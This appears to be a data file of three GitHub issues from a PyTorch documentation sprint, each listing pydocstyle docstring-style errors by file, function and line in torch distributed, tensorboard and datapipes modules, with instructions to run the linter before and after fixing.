"Fix docstring errors in _composable_state.py, remote_device.py, value_ranges.py, utils.py, run.py, rendezvous.py, launch.py, argparse_util.py, __init__.py, _cycles.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `increasing_map`, **Line**: 104, **Description**: First line should end with a period (not 'n')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `increasing_map`, **Line**: 104, **Description**: First word of the first line should be properly capitalized ('Map', not 'map')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `decreasing_map`, **Line**: 110, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `decreasing_map`, **Line**: 110, **Description**: First word of the first line should be properly capitalized ('Map', not 'map')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `monotone_map`, **Line**: 116, **Description**: First line should end with a period (not 't')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `monotone_map`, **Line**: 116, **Description**: First word of the first line should be properly capitalized ('Check', not 'check')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `convex_min_zero_map`, **Line**: 124, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `convex_min_zero_map`, **Line**: 124, **Description**: First line should be in imperative mood; try rephrasing (found 'the')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `convex_min_zero_map`, **Line**: 124, **Description**: First word of the first line should be properly capitalized ('The', not 'the')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `coordinatewise_increasing_map`, **Line**: 133, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `coordinatewise_increasing_map`, **Line**: 133, **Description**: First word of the first line should be properly capitalized ('Map', not 'map')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `coordinatewise_monotone_map`, **Line**: 142, **Description**: First line should end with a period (not 'x')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `coordinatewise_monotone_map`, **Line**: 142, **Description**: First word of the first line should be properly capitalized ('Compute', not 'compute')
- **File**: `torch/utils/viz/_cycles.py`, **Entity**: `object_annotation`, **Line**: 207, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/viz/_cycles.py`, **Entity**: `object_annotation`, **Line**: 207, **Description**: First line should end with a period (not 'g')
- **File**: `torch/utils/viz/_cycles.py`, **Entity**: `warn_tensor_cycles`, **Line**: 435, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/viz/_cycles.py`, **Entity**: `warn_tensor_cycles`, **Line**: 435, **Description**: First line should end with a period (not 'p')
- **File**: `torch/utils/viz/_cycles.py`, **Entity**: `warn_tensor_cycles`, **Line**: 435, **Description**: First line should be in imperative mood; try rephrasing (found 'Reference')
- **File**: `torch/distributed/argparse_util.py`, **Entity**: `env`, **Line**: 13, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/argparse_util.py`, **Entity**: `env`, **Line**: 13, **Description**: First line should end with a period (not 'g')
- **File**: `torch/distributed/argparse_util.py`, **Entity**: `env`, **Line**: 13, **Description**: No blank lines allowed between a section header and its content ('Example')
- **File**: `torch/distributed/argparse_util.py`, **Entity**: `check_env`, **Line**: 61, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/argparse_util.py`, **Entity**: `check_env`, **Line**: 61, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/argparse_util.py`, **Entity**: `check_env`, **Line**: 61, **Description**: No blank lines allowed between a section header and its content ('Example')
- **File**: `torch/distributed/_composable_state.py`, **Entity**: `_get_module_state`, **Line**: 20, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/_composable_state.py`, **Entity**: `_get_module_state`, **Line**: 20, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/_composable_state.py`, **Entity**: `_get_module_state`, **Line**: 20, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/launch.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/launch.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/remote_device.py`, **Entity**: `worker_name`, **Line**: 81, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/remote_device.py`, **Entity**: `worker_name`, **Line**: 81, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/remote_device.py`, **Entity**: `rank`, **Line**: 88, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/remote_device.py`, **Entity**: `rank`, **Line**: 88, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/remote_device.py`, **Entity**: `device`, **Line**: 95, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/remote_device.py`, **Entity**: `device`, **Line**: 95, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/rendezvous.py`, **Entity**: `register_rendezvous_handler`, **Line**: 23, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/distributed/rendezvous.py`, **Entity**: `_create_c10d_store`, **Line**: 151, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/rendezvous.py`, **Entity**: `_create_c10d_store`, **Line**: 151, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/run.py`, **Entity**: ``, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/run.py`, **Entity**: ``, **Line**: 9, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/run.py`, **Entity**: `get_args_parser`, **Line**: 393, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/run.py`, **Entity**: `get_args_parser`, **Line**: 393, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/distributed/run.py`, **Entity**: `get_use_env`, **Line**: 668, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/run.py`, **Entity**: `get_use_env`, **Line**: 668, **Description**: First line should be in imperative mood (perhaps 'Retrieve', not 'Retrieves')
- **File**: `torch/distributed/run.py`, **Entity**: `run_script_path`, **Line**: 761, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/run.py`, **Entity**: `run_script_path`, **Line**: 761, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/distributed/__init__.py`, **Entity**: `is_available`, **Line**: 8, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/__init__.py`, **Entity**: `is_available`, **Line**: 8, **Description**: First line should end with a period (not ',')
- **File**: `torch/distributed/__init__.py`, **Entity**: `is_available`, **Line**: 8, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/utils.py`, **Entity**: `_pack_kwargs`, **Line**: 16, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/utils.py`, **Entity**: `_pack_kwargs`, **Line**: 16, **Description**: First line should end with a period (not ')')
- **File**: `torch/distributed/utils.py`, **Entity**: `_cast_forward_inputs`, **Line**: 47, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/utils.py`, **Entity**: `_recursive_to`, **Line**: 88, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/utils.py`, **Entity**: `_p_assert`, **Line**: 141, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/utils.py`, **Entity**: `_p_assert`, **Line**: 141, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/distributed/utils.py`, **Entity**: `_p_assert`, **Line**: 141, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/utils.py`, **Entity**: `_p_assert`, **Line**: 141, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/utils.py`, **Entity**: `_sync_module_states`, **Line**: 276, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/utils.py`, **Entity**: `_sync_module_states`, **Line**: 276, **Description**: First line should end with a period (not 'n')
- **File**: `torch/distributed/utils.py`, **Entity**: `_sync_module_states`, **Line**: 276, **Description**: First line should be in imperative mood (perhaps 'Sync', not 'Syncs')
- **File**: `torch/distributed/utils.py`, **Entity**: `_sync_params_and_buffers`, **Line**: 301, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/utils.py`, **Entity**: `_sync_params_and_buffers`, **Line**: 301, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/utils.py`, **Entity**: `_sync_params_and_buffers`, **Line**: 301, **Description**: First line should be in imperative mood (perhaps 'Synchronize', not 'Synchronizes')

cc @carljparker",False
"Fix docstring errors in summary.py, _caffe2_graph.py, writer.py, _pytorch_graph.py, constants.py, _utils.py, _proto_graph.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `attr_value_proto`, **Line**: 8, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `attr_value_proto`, **Line**: 8, **Description**: First line should end with a period (not 'g')
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `attr_value_proto`, **Line**: 8, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `tensor_shape_proto`, **Line**: 23, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `tensor_shape_proto`, **Line**: 23, **Description**: First line should end with a period (not 'g')
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `tensor_shape_proto`, **Line**: 23, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `node_proto`, **Line**: 38, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `node_proto`, **Line**: 38, **Description**: First line should end with a period (not 'g')
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `node_proto`, **Line**: 38, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `GraphPy`, **Line**: 122, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `GraphPy`, **Line**: 122, **Description**: First line should end with a period (not 'n')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `to_proto`, **Line**: 216, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `to_proto`, **Line**: 216, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `to_proto`, **Line**: 216, **Description**: First line should be in imperative mood (perhaps 'Convert', not 'Converts')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `parse`, **Line**: 237, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `parse`, **Line**: 237, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `parse`, **Line**: 237, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `graph`, **Line**: 322, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `graph`, **Line**: 322, **Description**: First line should end with a period (not 'o')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `graph`, **Line**: 322, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `_set_model_to_eval`, **Line**: 368, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `_node_get`, **Line**: 385, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **File**: `torch/utils/tensorboard/_utils.py`, **Entity**: `_prepare_video`, **Line**: 40, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_utils.py`, **Entity**: `_prepare_video`, **Line**: 40, **Description**: First line should end with a period (not ']')
- **File**: `torch/utils/tensorboard/_utils.py`, **Entity**: `_prepare_video`, **Line**: 40, **Description**: First line should be in imperative mood (perhaps 'Convert', not 'Converts')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `hparams`, **Line**: 76, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `hparams`, **Line**: 76, **Description**: First line should be in imperative mood (perhaps 'Output', not 'Outputs')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `scalar`, **Line**: 265, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `scalar`, **Line**: 265, **Description**: First line should be in imperative mood (perhaps 'Output', not 'Outputs')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `histogram_raw`, **Line**: 308, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `histogram_raw`, **Line**: 308, **Description**: First line should be in imperative mood (perhaps 'Output', not 'Outputs')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `histogram`, **Line**: 340, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `histogram`, **Line**: 340, **Description**: First line should be in imperative mood (perhaps 'Output', not 'Outputs')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `image`, **Line**: 415, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `image`, **Line**: 415, **Description**: First line should be in imperative mood (perhaps 'Output', not 'Outputs')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `image_boxes`, **Line**: 453, **Description**: First line should be in imperative mood (perhaps 'Output', not 'Outputs')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `make_image`, **Line**: 482, **Description**: First line should end with a period (not 'f')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `_get_tensor_summary`, **Line**: 734, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `_get_json_config`, **Line**: 791, **Description**: First line should be in imperative mood (perhaps 'Parse', not 'Parses')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `mesh`, **Line**: 802, **Description**: First line should be in imperative mood (perhaps 'Output', not 'Outputs')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: ``, **Line**: 1, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `__init__`, **Line**: 55, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `__init__`, **Line**: 55, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `get_logdir`, **Line**: 81, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_event`, **Line**: 85, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_event`, **Line**: 85, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_summary`, **Line**: 101, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_summary`, **Line**: 101, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_graph`, **Line**: 116, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_onnx_graph`, **Line**: 135, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `flush`, **Line**: 146, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `close`, **Line**: 153, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `reopen`, **Line**: 159, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `SummaryWriter`, **Line**: 168, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `SummaryWriter`, **Line**: 168, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `__init__`, **Line**: 187, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `__init__`, **Line**: 187, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `__init__`, **Line**: 187, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `_check_caffe2_blob`, **Line**: 260, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `_check_caffe2_blob`, **Line**: 260, **Description**: First line should end with a period (not 'f')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `_get_file_writer`, **Line**: 275, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `get_logdir`, **Line**: 296, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_scalars`, **Line**: 394, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_histogram_raw`, **Line**: 501, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_pr_curve`, **Line**: 981, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_pr_curve`, **Line**: 981, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_pr_curve_raw`, **Line**: 1033, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_custom_scalars_multilinechart`, **Line**: 1069, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_custom_scalars_multilinechart`, **Line**: 1069, **Description**: First line should end with a period (not 't')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_custom_scalars_marginchart`, **Line**: 1088, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_custom_scalars_marginchart`, **Line**: 1088, **Description**: First line should end with a period (not 't')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_custom_scalars`, **Line**: 1106, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_custom_scalars`, **Line**: 1106, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_mesh`, **Line**: 1137, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_mesh`, **Line**: 1137, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `flush`, **Line**: 1193, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_rename_tensorflow_style`, **Line**: 42, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_convert_to_ssa`, **Line**: 82, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_add_gradient_scope`, **Line**: 217, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_add_gradient_scope`, **Line**: 217, **Description**: First line should end with a period (not 'a')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_replace_colons`, **Line**: 243, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_replace_colons`, **Line**: 243, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_fill_missing_operator_names`, **Line**: 267, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_add_tf_shape`, **Line**: 325, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_add_tf_shape`, **Line**: 325, **Description**: First line should end with a period (not 'f')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_add_tf_shape`, **Line**: 325, **Description**: First line should be in imperative mood (perhaps 'Convert', not 'Converts')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_set_tf_attr`, **Line**: 345, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_set_tf_attr`, **Line**: 345, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_operator_to_node`, **Line**: 390, **Description**: First line should be in imperative mood (perhaps 'Convert', not 'Converts')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_blob_to_node`, **Line**: 479, **Description**: First line should be in imperative mood (perhaps 'Convert', not 'Converts')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_clear_debug_info`, **Line**: 514, **Description**: First line should be in imperative mood (perhaps 'Remove', not 'Removes')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_check_if_forward`, **Line**: 537, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_operators_to_graph_def`, **Line**: 638, **Description**: First line should be in imperative mood; try rephrasing (found 'Main')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `model_to_graph_def`, **Line**: 762, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `model_to_graph_def`, **Line**: 762, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/hipify/constants.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/hipify/constants.py`, **Entity**: ``, **Line**: 1, **Description**: No whitespaces allowed surrounding docstring text

cc @carljparker",False
"Fix docstring errors in decoder.py, callable.py, combining.py, combinatorics.py, grouping.py, utils.py, structures.py, fileopener.py, snapshot.py, _convert_np.py, datapipe.py, common.py, filelister.py, sharding.py, streamreader.py, selecting.py, routeddecoder.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/utils/data/datapipes/datapipe.py`, **Entity**: `IterDataPipe`, **Line**: 43, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/datapipe.py`, **Entity**: `__getstate__`, **Line**: 158, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/datapipe.py`, **Entity**: `__getstate__`, **Line**: 158, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/utils/data/datapipes/datapipe.py`, **Entity**: `reset`, **Line**: 205, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/datapipe.py`, **Entity**: `reset`, **Line**: 205, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/data/datapipes/datapipe.py`, **Entity**: `MapDataPipe`, **Line**: 220, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/datapipe.py`, **Entity**: `__getstate__`, **Line**: 290, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/datapipe.py`, **Entity**: `__getstate__`, **Line**: 290, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/utils/data/datapipes/iter/routeddecoder.py`, **Entity**: `RoutedDecoderIterDataPipe`, **Line**: 19, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/routeddecoder.py`, **Entity**: `RoutedDecoderIterDataPipe`, **Line**: 19, **Description**: First line should end with a period (not 'a')
- **File**: `torch/utils/data/datapipes/iter/filelister.py`, **Entity**: `FileListerIterDataPipe`, **Line**: 15, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/callable.py`, **Entity**: `MapperIterDataPipe`, **Line**: 23, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/callable.py`, **Entity**: `MapperIterDataPipe`, **Line**: 23, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/callable.py`, **Entity**: `CollatorIterDataPipe`, **Line**: 173, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combinatorics.py`, **Entity**: `SamplerIterDataPipe`, **Line**: 18, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combinatorics.py`, **Entity**: `ShufflerIterDataPipe`, **Line**: 56, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combinatorics.py`, **Entity**: `ShufflerIterDataPipe`, **Line**: 56, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combinatorics.py`, **Entity**: `ShufflerIterDataPipe`, **Line**: 56, **Description**: First line should end with a period (not 'r')
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `ConcaterIterDataPipe`, **Line**: 26, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `ConcaterIterDataPipe`, **Line**: 26, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `ConcaterIterDataPipe`, **Line**: 26, **Description**: First line should end with a period (not 'l')
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `ForkerIterDataPipe`, **Line**: 64, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ContainerTemplate`, **Line**: 108, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ContainerTemplate`, **Line**: 108, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ContainerTemplate`, **Line**: 108, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `get_length_by_instance`, **Line**: 126, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `get_length_by_instance`, **Line**: 126, **Description**: First line should end with a period (not '`')
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ForkerIterDataPipe`, **Line**: 136, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ForkerIterDataPipe`, **Line**: 136, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ForkerIterDataPipe`, **Line**: 136, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ChildDataPipe`, **Line**: 275, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ChildDataPipe`, **Line**: 275, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ChildDataPipe`, **Line**: 275, **Description**: First line should end with a period (not 's')
